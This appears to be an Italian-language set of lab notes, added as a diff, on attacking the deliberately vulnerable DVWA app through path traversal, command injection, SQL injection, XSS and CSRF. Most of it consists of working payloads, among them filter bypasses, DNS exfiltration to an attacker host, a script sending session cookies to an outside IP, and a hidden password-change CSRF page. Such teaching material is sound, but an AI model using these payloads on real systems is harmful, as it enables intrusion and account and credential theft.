@@ -1,0 +1,374 @@
+﻿File path traversal:
+E’ una vulnerabilità che permette all’attaccante di muoversi nel file system del server su cui è eseguita l’applicazione vulnerabile, ed eventualmente visualizzare il contenuto dei file che vi sono presenti.
+Insufficiente validazione di sicurezza -> sanificazione dell’input di nomi di file forniti dall’utente, come caratteri speciali utilizzati per raggiungere la cartella root che vengono passati alle API dei file a livello web server. E’ conosciuto come attacco ../.
+
+Esempio:
+
+Livello Low:
+L’input inviato dall’utente viene direttamente inserito nel comando che recupera il file php da eseguire.
+
+DVWA -> File Inclusion:
+
+Cerchiamo /proc/version incrementando man mano i ../ che lo precedono. Ci accorgiamo che possiamo raggiungere la stessa cartella utilizzando /proc/version.
+
+Fatto ciò possiamo esplorare il file system, guardando file come 
+/proc/net/route per vedere le informazioni sulle tabelle di routing; 
+/proc/net/arp per vedere le tabelle arp della macchina e ottenere gli IP delle altre macchine interne alla rete; /proc/net/tcp e /proc/net/udp per determinare le connessioni aperte sul server.
+/proc/sched_debug per avere una lista di PID e sapere quali sono in esecuzione su quale CPU.
+/proc/[PID]/cmdline visualizza tutto ciò che è stato necessario ad invocare il processo.
+/proc/[PID]/status
+/proc/[PID]/environ visualizza tutte le variabili che sono state settate quando il processo è stato invocato. (This also sometimes contains useful paths to configuration files as well as usernames and passwords) -> Permesso negato.
+/proc/[PID]/pwd per sapere la directory di lavoro del processo corrente -> Permesso negato.
+/proc/[PID]/fd[#] fornisce l’accesso al file descriptor utilizzato. In alcuni casi può essere usato per leggere i file aperti dal processo -> Permesso negato.
+/etc/passwd per vedere gli hash delle password degli utenti del sistema; 
+
+Livello medium:
+L’input viene filtrato e le sequenze ‘../’ e ‘..\’ vengono eliminate. Basta quindi annidare le sequenze come segue ‘....//’ per bypassare il controllo. 
+Inoltre il controllo può essere bypassato inserendo le sequenze corrispondenti al carattere / (il punto non ha una codifica) nello schema dell’url-encoding.
+Breve inciso su url-encoding:
+E’ un meccanismo di traduzione per i caratteri speciali o non stampabili in un formato universalmente accettato dai server web e dai browser. La codifica dell’informazione può essere applicata agli Uniform Resource Names(URNs), Uniform Resource Identifiers(URIs), Uniform Resource Locators(URLs), e i caratteri selezionati nell’url sono rimpiazzati da una o più triple che comprendono il carattere “percentuale” e due cifre esadecimali. Queste ultime due rappresentano il valore numerico dei caratteri che vengono rimpiazzati. L’url encoding è largamente usato nei form HTML e nelle richieste HTTP.
+
+Quindi la sequenza ../ diventa ..%2F.
+
+Mitigation:
+validazione di sicurezza -> sanificazione dell’input di nomi di file forniti dall’utente, come caratteri speciali utilizzati per raggiungere la cartella root che vengono passati alle API dei file a livello web server.
+
+
+OS Command Injection:
+Aka shell injection è una vulnerabilità web che permette ad un attaccante di eseguire comandi del sistema operativo sul server su cui l’applicazione è in esecuzione. Il più delle volte l’attaccante sfrutta un OS Command injection per compromettere altre parti dell’infrastruttura di cui il server fa parte, sfruttando “relazioni di fiducia”.
+
+PHP DVWA -> Ci ricordiamo che il simbolo “&” è un separatore nella shell di comando, e quindi quello che viene eseguito è il ping ad un IP “vuoto” e il comando da noi inserito.
+
+Lista principali separatori:
+Windows/Unix
+& -> separatore posto avanti ad un comando ne crea un processo che viene eseguito in background.
+&& -> separatore che dato a&&b esegue b solo se a va a buon fine.
+| -> pipeline: l’output del primo comando viene usato come input del secondo.
+|| -> A||B -> esegui B solo se A fallisce.
+; A;B -> esegui A e poi B.
+
+Esempio:
+&& whoami &&: visualizza il nome dell’utente corrente.
+&& uname -a &&: visualizza il sistema operativo in esecuzione.
+&& ps -ef &&: processi attivi. 
+&& ifconfig &&: configurazione di rete.
+&& netstat -an &&: connessioni attive.
+
+La seconda && si utilizza per separare il comando inserito da qualunque cosa possa seguirlo, in modo da minimizzare la probabilità che quello che segue interferisca con l’esecuzione del comando.
+
+Infine anche in questo caso si può esplorare il file system proprio come nel traversal:
+&& ls ../../ &&.
+E’ possibile ridirezionare l’output di un comando verso un file e poi andarlo a leggere eseguendo cat:
+&& whoami > /var/www/DVWA/vulnerabilities/whoami.txt &&
+
+Opzionale:
+E’ possibile anche utilizzare il comando nslookup per effettuare una richiesta DNS ad un sito gestito dall’attaccante, il quale può monitorare la specifica richiesta in arrivo e determinare se il comando si andato a buon fine.
+& nslookup attacker.site.com: effettua una richiesta DNS al sito dell’attacante.
+Versione sofisticata:
+& ‘whoami’.attacker.site.com: effettua una richiesta contenente il risultato del comando.
+
+Livello medium:
+Lo script php filtra gli input contenenti i caratteri &&  e ;. Dunque utilizziamo qualunque altro separatore per iniettare il comando. Continuano a funzionare i precedenti comandi.
+
+Livello High:
+Nella black list risulta un errore di controllo. Infatti in corrispondenza del filtro su ‘| ‘, risulta inserito uno spazio. Questo ci permette di bypassare il controllo inserendo |comando. Inoltre l’ordine con cui i caratteri sono inseriti nel vocabolario permette di effettuare un altro exploit. Infatti inserendo la stringa ‘|| comando’, la prima sequenza individuata ed eliminata sarà ‘| ‘, e l’injection risultante’|comando’.
+
+Mitigation:
+Come prima con la differenza che in questo caso i caratteri utilizzati sono i separatori utilizzati nella linea di comando.
+
+SQL Injection:
+E’ una vulnerabilità che permette all’attaccante di agire sulle query che l’applicazione fa al database. Generalmente permette di leggere dati che normalmente non dovrebbero essere consultabili.
+Questo può includere dati riguardanti altri utenti, e alcuni altri dati a cui l’applicazione è in grado di accedere. Nella maggior parte dei casi un attaccante può modificare o cancellare tali file causando cambiamenti persistenti al contenuto dell’applicazione e al suo comportamento. Nei casi estremi l’attaccante riesce a compromettere il server sottostante o altre parti dell’infrastruttura back-end.
+
+ESEMPIO UNION SQL Injection:
+Andiamo inizialmente ad inserire nel form presente nella pagine un numero id valido per vedere come si comporta l’applicazione e notiamo che restituisce in output 2 informazioni riguardanti il first_name e il surname(da ciò possiamo già intuire che il numero di informazioni ricavate dal database è di un paio).
+
+Trovare numero di colonne della select originale:
+‘ UNION SELECT NULL -- -
+‘ UNION SELECT  NULL,NULL,... -- -
+Come si vede dallo script i risultati della prima query sono 2.
+
+Troviamo il numero versione del DB:
+‘ UNION SELECT @@version, @@version -- -
+
+
+Provando ad indovinare il nome di una tabella l’applicazione restituisce il nome del db. Ad es:
+' UNION SELECT first_name, password FROM Users -- -
+
+Introduciamo e ricorriamo ad information_schema.
+
+Troviamo i nomi delle tabelle del DB:
+' UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables -- -
+
+Che mostra in output il nome e il database di appartenenza di ogni tabella presente in inforation_schema.
+
+Proviamo a capire quante tabelle ci sono nel database:
+
+' UNION SELECT TABLE_NAME, TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_SCHEMA != 'information_schema' -- -
+
+'UNION SELECT TABLE_CATALOG, TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = "dvwadb" -- -
+Mostra invece solo le tabelle appartenenti al database dvwadb di cui la nostra applicazioni usufruisce.
+
+Cerchiamo i nomi delle colonne della tabella users:
+' UNION SELECT COLUMN_NAME, TABLE_NAME FROM information_schema.columns -- -
+
+
+Ctrl+f users -> Otteniamo i first_name e le password degli utenti di dvwa:
+' UNION SELECT first_name, password FROM users -- -
+
+Esempio SQL injection Blind:
+Per vedere invece il nome dell’utente con cui l’applicazione utilizza il database:
+' UNION SELECT user(), @@version -- -
+
+' UNION SELECT user(), database() -- -
+
+Livello medium:
+Lo script in PHP richiama la funzione mysql_real_escape_string() sull’input dell’utente, ma prosegue inserendo il risultato della funzione nella query senza quotes (‘), il che rende possibile effettuare le injection senza inserire il carattere ‘ nel payload per poter iniettare le query precedenti.
+
+ESEMPIO UNION SQL Injection:
+Andiamo inizialmente ad inserire nel form presente nella pagine un numero id valido per vedere come si comporta l’applicazione e notiamo che restituisce in output 2 informazioni riguardanti il first_name e il surname(da ciò possiamo già intuire che il numero di informazioni ricavate dal database è di un paio).
+Poi procediamo inserendo i caratteri che generalmente provocherebbero delle query malformate che restituisco quindi degli errori. Da questi iniziamo il nostro lavoro di inferenza.
+
+Trovare numero di colonne della select originale:
+UNION SELECT NULL -- -
+UNION SELECT  NULL,NULL,... -- -
+Come si vede dallo script i risultati della prima query sono 2.
+
+Troviamo il numero versione del DB:
+UNION SELECT @@version, @@version -- -
+
+
+Provando ad indovinare il nome di una tabella l’applicazione restituisce il nome del db. Ad es:
+UNION SELECT first_name, password FROM Users -- -
+
+Introduciamo e ricorriamo ad information_schema.
+
+Troviamo i nomi delle tabelle del DB:
+UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables -- -
+Che mostra in output il nome e il database di appartenenza di ogni tabella presente in inforation_schema.
+
+UNION SELECT TABLE_CATALOG, TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = "dvwadb" -- -
+Mostra invece solo le tabelle appartenenti al database dvwadb di cui la nostra applicazioni usufruisce.
+
+Cerchiamo i nomi delle colonne della tabella users:
+UNION SELECT COLUMN_NAME, TABLE_NAME FROM information_schema.columns -- -
+
+
+Ctrl+f users -> Otteniamo i first_name e le password degli utenti di dvwa:
+UNION SELECT first_name, password FROM users -- -
+
+Esempio SQL injection Blind:
+Per vedere invece il nome dell’utente con cui l’applicazione utilizza il database:
+UNION SELECT user(), @@version -- -
+
+
+Livello Hard:
+L’input non viene filtrato, ma  inserito in una query nella quale è seguito dall’opzione LIMIT, che viene utilizzata per visualizzare un determinato numero di risultati ottenuti dal database.
+Andando a rivedere i comandi precedentemente utilizzati, questo non deve minimamente preoccuparci, in quanto tutto quello che segue i caratteri ‘--’ è un commento, eludendo quindi la restrizione.
+
+
+Script SQLi Blind:
+Nell’esempio presentato con DVWA l’applicazione restituisce la pagina corrente con una scritta rossa generata in base al risultato ottenuto dalla query passata al database e sopprime qualunque errore che ne verrebbe generato.
+Quindi le SQL Blind si basano sulla pagina restituita dall’applicazione. Partiamo con il classico esempio ‘ or 1=1 -- - e ‘or 1=2 -- -, per capire come reagisce la web app. Poi iniziamo ad interrogare il database con query che possono restituire soltanto due valori (vero o falso). In questo modo possiamo ricavare ad esempio il nome utente iterando sulle lettere del nome query simili alle seguenti:
+
+' or substring(user(),1,1) = 'a
+' or substring(user(),1,1) = 'b
+' or substring(user(),1,1) = 'c
+…
+' or substring(user(),1,1) = 'r
+
+
+Per ogni lettera dell’alfabeto. Allo stesso modo possiamo fare per trovare il nome del DB:
+
+' or substring(database(),1,1) = 'a' -- -
+' or substring(database(),1,1) = 'b' -- -
+' or substring(database(),1,1) = 'c' -- -
+' or substring(database(),1,1) = 'd' -- -
+
+
+Livello medium:
+Intercettiamo la richiesta con burp e la salviamo in un file con un asterisco in corrispondenza del punto di iniezione, in modo da indicare successivamente a sqlmap dove effettuare i test.
+
+sqlmap -r DVWAPOSTSQLiBlind.txt --technique=B --dbs
+
+sqlmap -r DVWAPOSTSQLiBlind.txt --technique=B --banner
+
+Andiamo a limitare la ricerca solo per le tabelle del database dvwadb:
+
+sqlmap -r DVWAPOSTSQLiBlind.txt --technique=B -D=dvwadb --tables (-v5)
+
+Da cui si intuisce che per bypassare il controllo di real_escape_string è possibile utilizzare i valori utilizzata nell’url encoding. Dunque volendo effettuare l’injection manualmente, il payload da inviare con burp al server diventa:
+id=1%25271=1&Submit=Submit
+
+Questa nuovo modo di filtrare l’input e di inserirlo nella query senza apici, rende insidioso l’utilizzo dei comandi utilizzati in precedenza.
+In questo caso quindi dovendo evitare l’utilizzo di apici e dunque di caratteri, ricorriamo alla funzione ascii() di SQL che permette di ottenere l’intero corrispondente al carattere in input nella tabella ASCII. In questa tabella le lettere maiuscole iniziano da A = 65 e le minuscole da a = 97. Dunque i precedenti comandi diventano:
+
+' or ascii(substring(user(),1,1))=97-- -
+' or ascii(substring(user(),1,1))=98-- -
+' or ascii(substring(user(),1,1))=99-- -
+…
+' or ascii(substring(user(),1,1))=144-- -
+e
+
+' or ascii(substring(user(),1,1))=65-- -
+' or ascii(substring(user(),1,1))=66-- -
+' or ascii(substring(user(),1,1))=67-- -
+' or ascii(substring(user(),1,1))=68-- -
+
+Andiamo quindi a vedere come sqlmap riesce comunque a dumpare il database.
+La prima query trovata che restituisce un risultato positivo è:
+
+%20AND%20(1083)%3D1083
+
+%20AND%201084%3E1083
+
+%20AND%20(SELECT%200x41417755)%3D%27AAwU%27
+
+%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwadb.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C7%2C1%29%29%3E47
+
+Livello hard:
+%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28name%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwadb.guestbook%20ORDER%20BY%20name%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E114
+
+
+
+####################################################
+XSS (Cross Site Scripting)
+XSS attack è un client side attack che permette all'attaccante di confezionare una specifica richiesta web per iniettare codice estraneo.
+3 tipi
+-reflected
+-stored
+-DOM-based
+
+Reflected XSS quando il valore di un input di una form viene passato direttamente nell'URL in GET o POST tramite una variabile e letta dall'applicazione
+
+Stored XSS quando il valore di un input viene salvato sul server in un file o DB senza sanitizzare il contenuto e poi letto dalla web application 
+
+DOM-based XSS quando un utente già loggato ad una web app vi accede successivamente con un url in cui è iniettato codice javascript malevolo, il server risponde e la risposta viene elaborata dal browser della vittima che esegue anche il codice javascript harcodato.
+DVWA
+----------------------------------------------------------------------
+Mostrare esempio di XSS reflected
+
+livello low
+mostrare che il codice php non effettua nessun filtro sull'input quindi inserendo lo script <script>alert(xss)</script> l'exploit funziona
+
+livello medium
+viene filtrata la parola <script>, quindi basta modificare la parola con <Script> per poter eseguire l'exploit
+
+livello high
+viene applicata una regexp tale per cui ogni parola contenente "script" case insensitive viene filtrata (farlo vedere con www.regexr.com), è possibile comunque eseguire javascript senza utilizzare la parola "script" ad esempio <b onmouseover=alert('xss')> Click me </b>
+
+----------------------------------------------------------------------
+Mostrare esempio di XSS stored
+livello low
+il campo name non permette più di 10 caratteri ma il campo message è libero
+mostrare che il codice php non effettua nessun filtro sull'input quindi la query che salva il testo del messaggio permette poi l'esecuzione dello script <script>alert(xss)</script> quando si visita la pagina con il testo del messaggio renderizzato l'exploit funziona
+
+livello medium
+il campo name non permette più di 10 caratteri ma il campo message è libero
+viene filtrata la parola <script> nel campo name, quindi basta modificare la parola con <Script> per poter eseguire l'exploit, siccome il campo name ha un numero di caratteri ristretto usare BurpSuite per intercettare la chiamata e modificarla nel Repeater 
+
+livello high
+viene applicata una regexp tale per cui ogni parola contenente "script" case insensitive viene filtrata (farlo vedere con www.regexr.com), è possibile comunque eseguire javascript senza utilizzare la parola "script" ad esempio <b onmouseover=alert('xss')> Click me </b> sempre utilizzando BurpSuite, intercettando la chiamata e modificando il valore di name
+
+----------------------------------------------------------------------
+Mostrare esempio di XSS DOM based
+livello low
+nessuna protezione quindi basta agganciare al valore della lang lo script <script>alert('xss')</script> per far funzionare l'exploit
+
+livello medium
+<select name="default">
+	<script>
+		if (document.location.href.indexOf("default=") >= 0) {
+			var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
+			document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
+			document.write("<option value='' disabled='disabled'>----</option>");
+		}
+		    
+		document.write("<option value='English'>English</option>");
+		document.write("<option value='French'>French</option>");
+		document.write("<option value='Spanish'>Spanish</option>");
+		document.write("<option value='German'>German</option>");
+	</script>
+</select>
+
+effettuo una chiamata per modificare il DOM in questo modo
+
+<select name="default">
+	<script>
+		if (document.location.href.indexOf("default=") >= 0) {
+			var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
+			document.write("<option value='+ PAYLOAD ></option> </select> <body onload=alert('xss');> /PAYLOAD +'>" + decodeURI(lang) + "</option>");
+			document.write("<option value='' disabled='disabled'>----</option>");
+		}
+		    
+		document.write("<option value='English'>English</option>");
+		document.write("<option value='French'>French</option>");
+		document.write("<option value='Spanish'>Spanish</option>");
+		document.write("<option value='German'>German</option>");
+	</script>
+</select>
+
+livello high
+http://192.168.1.37/DVWA/vulnerabilities/xss_d/?default=English#
+tutto quello che viene scritto dopo il # non viene eseguito dal server quindi possiamo inserire lo script qui
+
+http://192.168.1.37/DVWA/vulnerabilities/xss_d/?default=English#<script>alert('xss');</script>
+
+----------------------------------------------------------------------
+Da XSS a session hijacking
+Cookie Stealing
+
+DVWA stored XSS livello medium (con hard viene filtrata la parola script)
+<script>new Image().src="http://10.1.1.1/pippo.php?output="+document.cookie;</script>   --> far vedere che così non funziona
+<script>new Image().src="http://192.168.1.223/pippo.php?output="%20document.cookie;</script>  --> far vedere che così funziona
+Far vedere che funziona per tutti quelli che visitano la pagina sia con netcat che con beef
+
+Force Download file
+<script>var link=document.createElement('a') link.href='http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download=document.body.appendChild(link); link.click();</script>
+
+Vari payload
+http://www.xss-payloads.com/payloads-list.html?c#category=capture
+
+Mitigation
+E' di solito possibile mitigare questa vulnerabilità adottando delle valide politiche di sanitizzazione degli input inseriti in una web application, far vedere tutti i livelli impossible
+
+################################################################
+CSRF Cros Site Request Forgery
+L'attaccante sfrutta una sessione valida di un utente in una web app per esegure richieste non volute o diverse da quelle originali, l'esecuzione può avvenire ad esempio tramite mail html con iframe che contengono web request preconfezionate alla web app.
+
+DVWA
+
+livello low
+Costruire una pagina html con gattini e una img con src http://<IP_DVWA>/DVWA/vulnerabilities/csrf/?password_new=pippo&password_conf=pippo&Change=Change#
+Chiamo la pagina http://<MIO_IP>/dvwa_homepage.html
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Test Page</title>
+</head>
+<body>
+<h1>This is a Test Page, nothing to do here</h1>	
+<img style="display:none" src="http://<IP_DVWA>/DVWA/vulnerabilities/csrf/?password_new=pippo&password_conf=pippo&Change=Change#" alt="">
+</body>
+</html>
+
+livello medium
+introduce un security check. Controlla che esista un HTTP referrer e il server name. Se il server name è presente nel HTTP referer, il cambio password funziona. altrimenti ottengo un errore.
+Usa la funzione PHP stripos  per effettuare il check.
+La funzione stripos() trova la prima posizione della prima occorrenza di un case-insensitive substring in una stringa. Quindi se metto il referer nel nome della mia homepage (<MIO_IP>_homepage.html) allora il condizionale if di controllo risulterà vero e il check risulterà inutile
+Chiamo la pagina http://<MIO_IP>/MIO_IP_homepage.html
+con lo setsso codice html di prima
+
+livello high
+Utilizzare un xss (reflected) per chiamare uno script js che rilevi lo user_token e lo utilizzi per una chiamata alla pagina di cambio password
+
+ad esempio:
+https://github.com/hoainam1989/training-application-security/blob/master/csrf/high.js
+
+Mitigation
+Insegnare all'utente a non cliccare su tutto quello che vede
+
+
+#################################################################
